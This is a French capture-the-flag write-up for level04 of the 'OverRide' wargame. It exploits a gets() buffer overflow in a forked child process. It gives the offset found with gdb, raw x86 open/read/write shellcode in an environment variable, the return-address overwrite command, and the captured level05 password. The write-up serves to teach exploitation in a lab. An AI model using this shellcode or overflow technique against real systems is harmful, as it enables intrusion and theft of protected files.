Le programme commence par faire un fork.
Le processus fils nous demande ensuite : "Give me some shellcode, k". Il récupère l'input via un "gets".

"gets" permet le buffer overflow. Notre faille se situe surement ici.

---

(gdb) set follow-fork-mode child
(gdb) r
Starting program: /home/users/level04/level04
[New process 6669]
Give me some shellcode, k
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Program received signal SIGSEGV, Segmentation fault.
[Switching to process 6669]
0x41326641 in ?? ()

---

L'Overflow se situe à 156.

---

level04@OverRide:~$ (python -c 'print "A" * 156 + "\xff\xff\xd7\xb1"[::-1]') | ./level04
Give me some shellcode, k
no exec() for you

----

Impossible de lancer execve() depuis notre shellcode. En effet, lorsque le processus fils tente de lancer execve(), SIGTRAP est envoyé au père, ce qui lui permet de reprendre le controle. Ce dernier vérifie si execve() (syscall 11) est appelé, au quel cas il "kill" le programme fils.

Nous devons trouver un autre moyen d'obtenir le .pass. Nous pouvons nous inspirer d'un exercice précédent ou un fopen et un fread était effectué.

Google : "shellcode open read write" et nous tombons sur : http://shell-storm.org/shellcode/files/shellcode-73.php

$(python -c 'print "export SHELLOPEN=" + "\x90"*100 + "\x31\xc0\x31\xdb\x31\xc9\x31\xd2" + "\xeb\x32\x5b\xb0\x05\x31\xc9\xcd" + "\x80\x89\xc6\xeb\x06\xb0\x01\x31" + "\xdb\xcd\x80\x89\xf3\xb0\x03\x83" + "\xec\x01\x8d\x0c\x24\xb2\x01\xcd" + "\x80\x31\xdb\x39\xc3\x74\xe6\xb0" + "\x04\xb3\x01\xb2\x01\xcd\x80\x83" + "\xc4\x01\xeb\xdf\xe8\xc9\xff\xff" + "\xff" + "/home/users/level05/.pass"')

level04@OverRide:~$ (python -c 'print "A" * 156 + "ADDRESSE DU SHELLCODE') | ./level04
Give me some shellcode, k
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
child is exiting...
